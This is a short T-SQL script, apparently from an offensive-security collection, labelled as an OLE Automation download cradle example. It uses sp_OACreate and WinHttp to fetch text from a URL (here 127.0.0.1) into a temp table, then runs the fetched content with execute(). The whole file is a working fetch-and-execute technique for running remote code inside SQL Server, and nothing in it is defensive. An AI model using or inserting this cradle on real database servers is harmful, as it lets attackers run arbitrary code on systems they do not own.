-- OLE Automation Procedure Download Cradle Example

-- Setup Variables
DECLARE @url varchar(300)   
DECLARE @win int  
DECLARE @hr  int  
DECLARE @text varchar(8000) 

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/test.txt'
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Create temp table to store downloaded string
CREATE TABLE #text(html text NULL) /* comment out to use @text variable for small data */ 

-- Setup namespace
EXEC @hr=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@win OUT  

-- Setup method
EXEC @hr=sp_OAMethod @win, 'Open',NULL,'GET',@url,'false' 

-- Send http GET request
EXEC @hr=sp_OAMethod @win,'Send'

-- Grab response and throw it in the temp table 
INSERT #text(html) 
EXEC @hr=sp_OAGetProperty @win,'ResponseText' 

-- Destroy the object
EXEC @hr=sp_OADestroy @win  

-- Select commad
SELECT @text = html from #text
SELECt @text

-- Run command
execute(@text) 

-- Remove temp table
drop table #text 

 
